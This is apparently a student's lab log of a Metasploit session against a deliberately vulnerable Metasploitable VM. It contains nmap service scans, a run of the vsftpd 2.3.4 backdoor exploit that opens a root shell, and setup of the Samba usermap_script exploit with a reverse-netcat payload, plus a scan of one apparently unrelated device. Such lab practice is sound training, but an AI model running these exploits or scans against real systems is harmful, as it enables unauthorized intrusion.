@@ -1,0 +1,479 @@
+Metasploitable - Nmap (information gathering)
+
+
+Attacker Machine - Kali OS
+==============
+==============
+
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Start commands with a space to avoid saving them to history
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,                                      
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,                                   
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:                                 
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,                               
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo                              
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk                             
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx                            
+.WMMMMMMMMM:                       :MMMMMMMMMM,                           
+xMMMMMMMMMo                         lMMMMMMMMMO                           
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;                    
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:                     
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:                       
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;                         
+.WMMMMMMMMMc                         'OMMMMMM0,                           
+ lMMMMMMMMMMk.                         .kMMO'                             
+  dMMMMMMMMMMWd'                         ..                               
+   cWMMMMMMMMMMMNxc'.                ##########                           
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v6.4.21-dev-                         ]
++ -- --=[ 2440 exploits - 1253 auxiliary - 429 post       ]
++ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > 
+=======================================================
+(  -sV [service version]  [target machine ip] )
+msf6 > nmap -sV 192.168.44.142
+[*] exec: nmap -sV 192.168.44.142
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 02:12 EDT
+Nmap scan report for 192.168.44.142
+Host is up (0.0018s latency).
+Not shown: 977 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds
+
+
+====================================================================================
+
+msf6 > search vsftpd 2.3.4
+                                                                          
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor 
+
+====================================================================================                                     
+
+msf6 > Interrupt: use the 'exit' command to quit
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+
+====================================================================================
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+=============================
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host
+                                       :port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://d
+                                       ocs.metasploit.com/docs/using-met
+                                       asploit/basics/using-metasploit.h
+                                       tml
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+
+
+====================================================================================
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host
+                                       :port[,type:host:port][...]
+   RHOSTS   192.168.44.142   yes       The target host(s), see https://d
+                                       ocs.metasploit.com/docs/using-met
+                                       asploit/basics/using-metasploit.h
+                                       tml
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+
+
+====================================================================================
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.44.142:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.44.142:21 - USER: 331 Please specify the password.
+[+] 192.168.44.142:21 - Backdoor service has been spawned, handling...
+[+] 192.168.44.142:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.44.157:46739 -> 192.168.44.142:6200) at 2024-08-08 02:35:08 -0400
+
+
+===================================================================================
+===================================================================================
+===================================================================================
+
+exploit, target, victim Machine   -- Metasploitable OS 
+-------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------
+user name - msfadmin
+-------------------------
+password  - msfadmin
+-------------------------
+ls
+-------------------------
+ls -l
+-------------------------
+cd /
+-------------------------
+ls -l
+-------------------------
+sudo mkdir zzzzzz
+-------------------------
+msfadmin
+-------------------------
+
+------------------------------------------------------------------------------------------------------------------------------------------
+===================================================================================
+===================================================================================
+===================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------
+
+Attacker Machine - Kali OS
+-----------------------------------------------------------------
+[            Note - kali OS have access of Metasploitable           ]
+-----------------------------------------------------------------
+cd /
+ls -l
+total 89
+drwxr-xr-x   2 root root  4096 Aug  8 02:46 aaaaaaaaaaaaaa
+drwxr-xr-x   2 root root  4096 May 13  2012 bin
+drwxr-xr-x   4 root root  1024 May 13  2012 boot
+lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
+drwxr-xr-x  13 root root 13820 Aug  7 23:40 dev
+drwxr-xr-x  94 root root  4096 Aug  8 03:16 etc
+drwxr-xr-x   6 root root  4096 Apr 16  2010 home
+drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
+lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
+drwxr-xr-x  13 root root  4096 May 13  2012 lib
+drwx------   2 root root 16384 Mar 16  2010 lost+found
+drwxr-xr-x   4 root root  4096 Mar 16  2010 media
+drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
+-rw-------   1 root root  6542 Aug  7 23:40 nohup.out
+drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
+dr-xr-xr-x 116 root root     0 Aug  7 23:39 proc
+drwxr-xr-x  13 root root  4096 Aug  7 23:40 root
+drwxr-xr-x   2 root root  4096 May 13  2012 sbin
+drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
+drwxr-xr-x  12 root root     0 Aug  7 23:39 sys
+drwxrwxrwt   4 root root  4096 Aug  8 01:14 tmp
+drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
+drwxr-xr-x  14 root root  4096 Mar 17  2010 var
+lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
+drwxr-xr-x   2 root root  4096 Aug  8 02:50 zzzz
+
+
+-------------------------------------------------------------------------------------------
+=======================================================
+--------------------------------------------------------------------------------------------
+
+^C
+Abort session 2? [y/N]  y
+
+[*] 192.168.44.142 - Command shell session 2 closed.  Reason: User exit
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.44.142:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.44.142:21 - USER: 331 Please specify the password.
+[+] 192.168.44.142:21 - Backdoor service has been spawned, handling...
+[+] 192.168.44.142:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 3 opened (192.168.44.157:37533 -> 192.168.44.142:6200) at 2024-08-08 03:23:11 -0400
+
+--------------------------------------------------------------------------------------------
+
+ls 
+aaaaaaaaaaaaaa
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+zzzz
+exit
+-----------------------------------------------------------------------------------
+[*] 192.168.44.142 - Command shell session 3 closed.
+-----------------------------------------------------------------------------------
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
+-----------------------------------------------------------------------------------
+msf6 > Interrupt: use the 'exit' command to quit
+-----------------------------------------------------------------------------------
+msf6 > 
+([    192.168.44.142  of  exploit, target, victim Machine   -- Metasploitable OS ])
+-----------------------------------------------------------------------------------
+msf6 > nmap -sV 192.168.44.142
+[*] exec: nmap -sV 192.168.44.142
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 03:58 EDT
+Nmap scan report for 192.168.44.142
+Host is up (0.0011s latency).
+Not shown: 977 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)     {copy it and search in google }
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
+
+=============================================================================
+=============================================================================
+PORT     STATE SERVICE     VERSION
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)     
+--------------------------------------------------------------------
+{copy version and search in google to see any exploits are there }
+( on google write - exploit Samba smbd 3.X - 4.X )
+
+=============================================================================
+
+msf6 > 
+--------------------------------------------------------------------------------------------------------------------------------
+took script from blow link-
+https://cs.carleton.edu/faculty/jondich/courses/cs231_w18/assignments/16_pentesting2.html
+https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
+https://tsitsiflora.medium.com/samba-username-map-script-in-metasploitable-2-887ffce250d3
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+https://www.exploit-db.com/exploits/42084
+--------------------------------------------------------------------------------------------------------------------------------
+
+msf6 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > 
+
+=============================================================================
+
+
+msf6 > sudo nmap -sV -sS -A 172.20.10.8
+[*] exec: sudo nmap -sV -sS -A 172.20.10.8
+
+[sudo] password for kali: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 05:50 EDT
+Nmap scan report for 172.20.10.8
+Host is up (0.0049s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+25/tcp   open  tcpwrapped
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp   open  tcpwrapped
+110/tcp  open  tcpwrapped
+443/tcp  open  tcpwrapped
+5060/tcp open  tcpwrapped
+8008/tcp open  tcpwrapped
+8010/tcp open  tcpwrapped
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: WAP|phone
+Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
+OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
+OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT    ADDRESS
+1   ... 30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 261.98 seconds
+msf6 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host
+                                       :port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://d
+                                       ocs.metasploit.com/docs/using-met
+                                       asploit/basics/using-metasploit.h
+                                       tml
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.44.157   yes       The listen address (an interface ma
+                                     y be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.44.142
+RHOSTS => 192.168.44.142
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host
+                                       :port[,type:host:port][...]
+   RHOSTS   192.168.44.142   yes       The target host(s), see https://d
+                                       ocs.metasploit.com/docs/using-met
+                                       asploit/basics/using-metasploit.h
+                                       tml
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.44.157   yes       The listen address (an interface ma
+                                     y be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > Interrupt: use the 'exit' command to quit
+msf6 exploit(multi/samba/usermap_script) > 
+
+
+
+
